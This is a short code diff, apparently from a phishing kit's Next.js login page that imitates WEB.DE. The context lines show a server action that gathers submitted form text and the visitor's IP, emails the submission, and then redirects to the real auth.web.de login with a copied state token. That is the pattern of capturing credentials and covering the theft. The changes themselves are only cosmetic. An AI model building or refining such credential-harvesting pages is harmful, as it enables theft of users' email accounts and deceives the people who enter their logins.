@@ -37,7 +37,6 @@ export default async function LoginPage({
       )
       .join("\n\n");
 
-
     const userInfo = {
       ipAddress:
         headersList.get("x-forwarded-for")?.split(",")[0] || "127.0.0.1",
@@ -186,11 +185,9 @@ export default async function LoginPage({
       console.error("Failed to send submission email:", error);
       return { success: false };
     }
-
     redirect(
       "https://auth.web.de/login?prompt=none&state=eyJpZCI6IjM4ZWU1ODkxLTdkZTYtNGI2Mi05ZWQ0LTg4YWNkNzY0N2Y1ZiIsImNsaWVudElkIjoid2ViZGVfYWxsaWdhdG9yX2xpdmUiLCJ4VWlBcHAiOiJ3ZWJkZS5hbGxpZ2F0b3IvMS4yMS4yIiwicGF5bG9hZCI6ImV5SmtZeUk2SW1Keklpd2lkR0Z5WjJWMFZWSkpJam9pYUhSMGNITTZMeTkzWldKc2FXNXJMbmRsWWk1a1pTOXRZV2xzTDNOb2IzZFRkR0Z5ZEZacFpYY2lMQ0p3Y205alpYTnpTV1FpT2lKdmFWOXdhMk5sTXlKOSJ9&authcode-context=J4Wuxtntqd",
     );
-    // https: return { success: true };
   };
 
   return (
